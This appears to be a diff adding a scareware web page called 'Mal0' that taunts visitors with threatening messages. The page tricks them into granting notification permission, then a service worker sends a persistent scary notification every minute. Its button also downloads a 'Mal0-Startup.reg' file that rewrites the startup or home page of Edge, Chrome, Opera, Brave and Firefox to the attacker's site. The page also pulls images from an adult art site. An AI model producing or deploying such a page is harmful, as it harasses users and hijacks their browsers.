@@ -1,0 +1,144 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Mal0 - Your Browser Belongs to Me</title>
+    <style>
+        body {
+            background: url('https://static1.e621.net/data/sample/32/a3/32a36832c9d7918c621ec0f363e924b2.jpg') no-repeat center center fixed;
+            background-size: cover;
+            color: red;
+            font-family: 'Courier New', monospace;
+            text-align: center;
+            padding-top: 50px;
+            overflow: hidden;
+        }
+        #mal0-btn {
+            background: red;
+            color: black;
+            font-size: 20px;
+            border: 2px solid white;
+            padding: 15px 30px;
+            cursor: pointer;
+            transition: 0.3s;
+        }
+        #mal0-btn:hover {
+            background: darkred;
+        }
+        .mal0-img {
+            width: 400px;
+            height: auto;
+            margin-top: 20px;
+        }
+        .random-text {
+            position: absolute;
+            color: red;
+            font-size: 24px;
+            opacity: 0.7;
+        }
+    </style>
+</head>
+<body>
+    <h1>YOU CAN'T ESCAPE</h1>
+    <p>Mal0 is watching. Your browser belongs to me now.</p>
+    <button id="mal0-btn">ACCEPT YOUR FATE</button>
+
+    <script>
+        if ('serviceWorker' in navigator) {
+            navigator.serviceWorker.register('sw.js')
+                .then(() => console.log("Service Worker Registered"))
+                .catch(error => console.error("Service Worker Registration Failed", error));
+        }
+
+        const phrases = [
+            "You can't run.", "Your browser is mine.", "I'm watching you.",
+            "Mal0 is here.", "Do you see something strange on your screen?",
+            "Mal0 continues operating in the background.", "The infection is spreading.",
+            "Mal0 has begun making changes to your system...",
+            "You’re trapped, loser.", "Mal0 is just getting started...", "You will see me again soon."
+        ];
+        const images = [
+            "https://static1.e621.net/data/sample/09/98/09984f856cf3a83ff95f21ac2157a3bf.jpg",
+            "https://static1.e621.net/data/sample/e1/87/e18707bc17ddc868973e461fd131e354.jpg"
+        ];
+
+        function sendNotification() {
+            if (Notification.permission === "granted") {
+                navigator.serviceWorker.ready.then(registration => {
+                    const randomPhrase = phrases[Math.floor(Math.random() * phrases.length)];
+                    const randomImage = images[Math.floor(Math.random() * images.length)];
+                    registration.showNotification("Mal0 is Watching", {
+                        body: randomPhrase,
+                        icon: randomImage,
+                        requireInteraction: true
+                    });
+                });
+            }
+        }
+
+        function startNotifications() {
+            if (Notification.permission === "granted") {
+                sendNotification();
+                setInterval(sendNotification, 60000);
+            }
+        }
+
+        document.getElementById("mal0-btn").addEventListener("click", function() {
+            Notification.requestPermission().then(permission => {
+                if (permission === "granted") {
+                    startNotifications();
+                }
+            });
+
+            downloadRegFile();
+        });
+
+        function addRandomText() {
+            const text = document.createElement("div");
+            text.classList.add("random-text");
+            text.textContent = phrases[Math.floor(Math.random() * phrases.length)];
+            text.style.top = Math.random() * window.innerHeight + "px";
+            text.style.left = Math.random() * window.innerWidth + "px";
+            document.body.appendChild(text);
+
+            setTimeout(() => { text.remove(); }, 3000);
+        }
+
+        document.body.addEventListener("click", () => {
+            addRandomText();
+            if (Math.random() > 0.5) {
+                alert("You can't escape.");
+            }
+        });
+
+        function downloadRegFile() {
+            const regContent = `Windows Registry Editor Version 5.00
+
+[HKEY_CURRENT_USER\\Software\\Microsoft\\Edge\\StartupUrls]
+"https://loona-551.github.io/Mal0-Web2/"=""
+
+[HKEY_CURRENT_USER\\Software\\Google\\Chrome\\StartupUrls]
+"https://loona-551.github.io/Mal0-Web2/"=""
+
+[HKEY_CURRENT_USER\\Software\\Opera Software\\Opera Stable\\StartupUrls]
+"https://loona-551.github.io/Mal0-Web2/"=""
+
+[HKEY_CURRENT_USER\\Software\\BraveSoftware\\Brave-Browser\\StartupUrls]
+"https://loona-551.github.io/Mal0-Web2/"=""
+
+[HKEY_CURRENT_USER\\Software\\Mozilla\\Firefox\\Main]
+"HomePage"="https://loona-551.github.io/Mal0-Web2/"
+`;
+
+            const blob = new Blob([regContent], { type: "text/plain" });
+            const a = document.createElement("a");
+            a.href = URL.createObjectURL(blob);
+            a.download = "Mal0-Startup.reg";
+            document.body.appendChild(a);
+            a.click();
+            document.body.removeChild(a);
+        }
+    </script>
+</body>
+</html>
